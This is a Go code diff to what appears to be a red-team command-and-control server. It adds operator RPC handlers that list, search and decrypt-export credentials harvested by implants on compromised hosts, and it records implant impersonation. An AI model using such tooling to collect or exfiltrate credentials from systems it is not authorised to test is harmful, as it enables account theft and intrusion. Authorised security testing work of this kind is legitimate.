@@ -958,6 +958,79 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 		}
 		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "name": name, "kind": kind})
 
+	case "creds.list":
+		// The vault of the engagement.  The values are not in here: the
+		// operator sees the shape of the material and asks for the value
+		// with creds.export.
+		agent, _ := args["agent"].(string)
+		kind, _ := args["kind"].(string)
+		query, _ := args["query"].(string)
+		limit, _ := asInt64(args["limit"])
+		records := s.Hub.Store().Credentials(agent, kind, query, int(limit))
+		out := make([]any, 0, len(records))
+		for _, record := range records {
+			out = append(out, toUpkMap(credentialMap(&record)))
+		}
+		return reply(upk.Map{
+			"credentials": out,
+			"count":       len(out),
+			"encrypted":   s.Hub.VaultEncrypted(),
+		})
+
+	case "creds.search":
+		query, _ := args["query"].(string)
+		if strings.TrimSpace(query) == "" {
+			return fail("creds.search needs a query")
+		}
+		kind, _ := args["kind"].(string)
+		agent, _ := args["agent"].(string)
+		limit, _ := asInt64(args["limit"])
+		records := s.Hub.Store().Credentials(agent, kind, query, int(limit))
+		out := make([]any, 0, len(records))
+		for _, record := range records {
+			out = append(out, toUpkMap(credentialMap(&record)))
+		}
+		return reply(upk.Map{
+			"credentials": out,
+			"count":       len(out),
+			"query":       query,
+			"encrypted":   s.Hub.VaultEncrypted(),
+		})
+
+	case "creds.export":
+		// The value of the material.  It comes out of the vault, so the
+		// server has to be able to open it: without a key the export says
+		// so instead of returning nothing.
+		if !s.Hub.VaultEncrypted() {
+			return fail("the vault has no key: configure vault_key before exporting")
+		}
+		agent, _ := args["agent"].(string)
+		kind, _ := args["kind"].(string)
+		query, _ := args["query"].(string)
+		limit, _ := asInt64(args["limit"])
+		records := s.Hub.Store().Credentials(agent, kind, query, int(limit))
+		out := make([]any, 0, len(records))
+		failed := 0
+		for _, record := range records {
+			fields := credentialMap(&record)
+			if record.Secret == "" {
+				failed++
+				continue
+			}
+			secret, err := s.Hub.VaultOpen(record.Secret)
+			if err != nil {
+				failed++
+				continue
+			}
+			fields["secret"] = secret
+			out = append(out, toUpkMap(fields))
+		}
+		return reply(upk.Map{
+			"credentials": out,
+			"count":       len(out),
+			"failed":      failed,
+		})
+
 	case "engagement.wipe":
 		// The end of an engagement: the record of the machines that were
 		// touched stops existing on the server.  The implants are not
@@ -1377,6 +1450,28 @@ func agentDataMap(a *store.Agent) map[string]any {
 		"persist": a.Persist,
 		// What the implant thinks of the host.
 		"posture": a.Posture,
+		// The account the implant runs as, when it is not the account it
+		// started with.
+		"impersonation": a.Impersonation,
+	}
+}
+
+// credentialMap is the record of the vault as the operator sees it.
+//
+// The secret is not in here: the value comes out of the vault with
+// creds.export, and only for the operators the role table allows.
+func credentialMap(c *store.Credential) map[string]any {
+	return map[string]any{
+		"id":         c.ID,
+		"agent_id":   c.AgentID,
+		"source":     c.Source,
+		"account":    c.Account,
+		"target":     c.Target,
+		"kind":       c.Kind,
+		"digest":     c.Digest,
+		"confidence": c.Confidence,
+		"note":       c.Note,
+		"collected":  c.Collected.Format(time.RFC3339),
 	}
 }
 
